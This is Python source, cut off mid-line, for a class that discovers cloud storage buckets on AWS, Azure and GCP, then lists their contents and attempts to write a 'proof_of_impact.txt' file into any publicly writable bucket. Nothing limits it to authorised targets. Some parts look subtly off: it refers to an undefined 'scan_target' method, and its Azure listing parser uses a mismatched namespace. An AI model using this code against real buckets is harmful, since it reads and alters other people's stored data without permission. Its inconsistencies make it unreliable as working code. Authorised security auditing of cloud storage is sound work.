import os
import sys
import json
import logging
import argparse
import requests
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AutomatedCloudStorageBucketMisconfigurationDetectionAndExploitation:
    """
    A class to automatically discover cloud storage buckets (AWS S3, Azure Blob, GCP Cloud Storage),
    check for misconfigurations such as public access, unencrypted data, or weak permissions,
    and attempt to exploit these findings by listing, reading, or writing test files.

    This implementation uses only the `requests` library alongside standard library modules.
    """

    def __init__(self, targets: Optional[List[Dict[str, Any]]] = None, output_file: Optional[str] = None):
        """
        Initialize the detector.

        Args:
            targets: Optional list of target dictionaries. Each dict should contain:
                     - 'provider': one of 'aws', 'azure', 'gcp'
                     - 'bucket_name': name of the bucket (for AWS/GCP) or container name (for Azure)
                     - 'storage_account': storage account name (only for Azure)
                     - 'region': optional region (for AWS/GCP)
            output_file: Optional path to save the final JSON report.
        """
        self.targets = targets if targets else []
        self.output_file = output_file
        self.results: List[Dict[str, Any]] = []

        # Predefined timeouts for HTTP requests
        self.timeout = 10

        # Test file content for write exploitation
        self.test_content = "This is a test file created to demonstrate bucket misconfiguration impact."
        self.test_file_name = "proof_of_impact.txt"

    # ----------------------------------------------------------------------
    # Public scanning/analysis methods
    # ----------------------------------------------------------------------

    def scan_bucket(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """
        Perform full scan on a single bucket target.

        Args:
            target: Dict with provider-specific information.

        Returns:
            Dict containing scan results and findings.
        """
        provider = target.get('provider', '').lower()
        bucket_name = target.get('bucket_name', '')
        storage_account = target.get('storage_account', '')
        region = target.get('region', 'us-east-1')

        result = {
            'target': target,
            'findings': [],
            'publicly_accessible': False,
            'listable': False,
            'writable': False,
            'exploitation_attempts': [],
            'timestamp': datetime.utcnow().isoformat() + 'Z'
        }

        # Provider-specific checks
        if provider == 'aws':
            self._inspect_aws_s3(bucket_name, region, result)
        elif provider == 'azure':
            self._inspect_azure_blob(storage_account, bucket_name, result)
        elif provider == 'gcp':
            self._inspect_gcp_storage(bucket_name, result)
        else:
            result['findings'].append(f"Unsupported provider: {provider}")

        self.results.append(result)
        return result

    def scan_all(self) -> List[Dict[str, Any]]:
        """
        Scan all targets provided at initialisation.

        Returns:
            List of result dictionaries.
        """
        if not self.targets:
            logger.warning("No targets provided. Use 'scan_target' method or provide targets.")
            return []

        for target in self.targets:
            try:
                self.scan_bucket(target)
            except Exception as e:
                logger.error(f"Error scanning target {target}: {e}")
        return self.results

    def list_bucket_contents(self, target: Dict[str, Any], max_keys: int = 10) -> List[str]:
        """
        Attempt to list objects in a publicly accessible bucket.

        Args:
            target: Target dict (same structure as in scan_bucket).
            max_keys: Maximum number of objects to list.

        Returns:
            List of object keys retrieved (empty if inaccessible).
        """
        provider = target.get('provider', '').lower()
        bucket_name = target.get('bucket_name', '')
        storage_account = target.get('storage_account', '')
        region = target.get('region', 'us-east-1')

        try:
            if provider == 'aws':
                url = f"https://{bucket_name}.s3.amazonaws.com/?list-type=2&max-keys={max_keys}"
                resp = requests.get(url, timeout=self.timeout)
                if resp.status_code == 200:
                    # Parse XML response
                    import xml.etree.ElementTree as ET
                    root = ET.fromstring(resp.content)
                    ns = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}
                    keys = [elem.text for elem in root.findall('.//s3:Key', ns)]
                    return [k for k in keys if k]
                else:
                    logger.debug(f"AWS S3 list failed with status {resp.status_code}")
                    return []
            elif provider == 'azure':
                url = f"https://{storage_account}.blob.core.windows.net/{bucket_name}?restype=container&comp=list&maxresults={max_keys}"
                resp = requests.get(url, timeout=self.timeout)
                if resp.status_code == 200:
                    import xml.etree.ElementTree as ET
                    root = ET.fromstring(resp.content)
                    # Azure uses default namespace
                    ns = {'': 'http://www.w3.org/2005/Atom'}
                    blobs = root.findall('.//Blob/Name', ns)
                    return [b.text for b in blobs if b.text]
                else:
                    logger.debug(f"Azure Blob list failed with status {resp.status_code}")
                    return []
            elif provider == 'gcp':
                # GCP JSON API
                url = f"https://storage.googleapis.com/storage/v1/b/{bucket_name}/o?maxResults={max_keys}"
                resp = requests.get(url, timeout=self.timeout)
                if resp.status_code == 200:
                    data = resp.json()
                    items = data.get('items', [])
                    return [item['name'] for item in items if 'name' in item]
                else:
                    logger.debug(f"GCP storage list failed with status {resp.status_code}")
                    return []
            else:
                logger.warning(f"Unsupported provider {provider}")
                return []
        except Exception as e:
            logger.error(f"Error listing bucket {bucket_name}: {e}")
            return []

    def attempt_write_test_file(self, target: Dict[str, Any]) -> bool:
        """
        Attempt to write a test file to a publicly writable bucket.

        Args:
            target: Target dict.

        Returns:
            True if write was successful, False otherwise.
        """
        provider = target.get('provider', '').lower()
        bucket_name = target.get('bucket_name', '')
        storage_account = target.get('storage_account', '')
        region = target.get('region', 'us-east-1')

        try:
            if provider == 'aws':
                url = f"https://{bucket_name}.s3.amazonaws.com/{self.test_file_name}"
                resp = requests.put(url, data=self.test_content, timeout=self.timeout)
                if resp.status_code in (200, 201, 204):
                    logger.info(f"Successfully wrote test file to AWS bucket {bucket_name}")
                    return True
                else:
                    logger.debug(f"AWS S3 write failed with status {resp.status_code}")
                    return False
            elif provider == 'azure':
                url = f"https://{storage_account}.blob.core.windows.net/{bucket_name}/{self.test_file_name}"
                headers = {'x-ms-blob-type': 'BlockBlob'}
                resp = requests.put(url, data=self.test_content, headers=headers, timeout=self.timeout)
                if resp.status_code in (200, 201, 202, 204):
                    logger.info(f"Successfully wrote test file to Azure container {bucket_name}")
                    return True
                else:
                    logger.debug(f"Azure Blob write failed with status {resp.status_code}")
                    return False
            elif provider == 'gcp':
                url = f"https://storage.googleapis.com/storage